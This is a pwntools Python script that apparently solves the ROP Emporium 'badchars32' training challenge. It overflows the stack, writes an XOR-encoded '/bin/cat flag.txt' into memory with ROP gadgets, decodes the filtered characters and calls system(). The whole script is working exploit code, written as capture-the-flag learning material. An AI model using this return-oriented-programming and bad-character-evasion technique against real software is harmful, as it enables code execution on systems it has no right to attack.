from pwn import *

# extend arr to be divisible by n (extend using ch
def extend(arr, n, ch):
	diff = 4 - (len(arr) % 4)
	arr.extend([ch] * diff)
	return arr

# convert string to integer in little endian in groups of 4 bytes
def string2int(st):
	def change(ch): return hex(ord(ch))[2:]
	arr = list(map(change, list(st)))
	arr = extend(arr, 4, '00')

	res = []
	for i in range(0, len(arr), 4):
		res.append(arr[i:i+4])

	for i in range(len(res)):
		each = res[i]
		each.reverse()
		fin = ''.join(each)
		res[i] = int(fin, 16)
	
	return res

e = ELF('./badchars32')
p = e.process()

print(p.recv().decode())

# raw_input('attach gdb')

st = '/bin/cat flag.txt'
badchars = ['b','i','c','/', ' ', 'f', 'n', 's']

# obtained by replacing bad characters with their result when xor with 2
good = '-`kl-aat"dlag.txt'

# positions of bad characters in st
pos = [0,1,2,3,4,5,8,9]

# number for xor
xorn = 2

hexs = string2int(good)

# base
base = 0x804a100

# address of system call instruction
system = 0x080487b7

# gadgets
# mov dword ptr [edi], esi ; ret
mov = p32(0x08048893)

# pop esi ; pop edi ; ret
pop = p32(0x08048899)

# xor byte ptr [ebx], cl ; ret
xorg = p32(0x08048890)

# pop ebx ; ret
ebx = p32(0x08048461)

# pop ecx ; ret
# used to manipulate CL register used in xorg
ecx = p32(0x08048897)

payload = b'A' * 44

mem = base
for n in hexs:
	payload += pop
	payload += p32(n)
	payload += p32(mem)
	payload += mov

	# increment mem to next address
	mem += 4

payload += ecx
payload += p32(xorn)

for val in pos:
	payload += ebx
	payload += p32(base+val)
	payload += xorg

payload += p32(system)
payload += p32(base)

p.sendline(payload)

flag = p.recv().decode()
success(flag)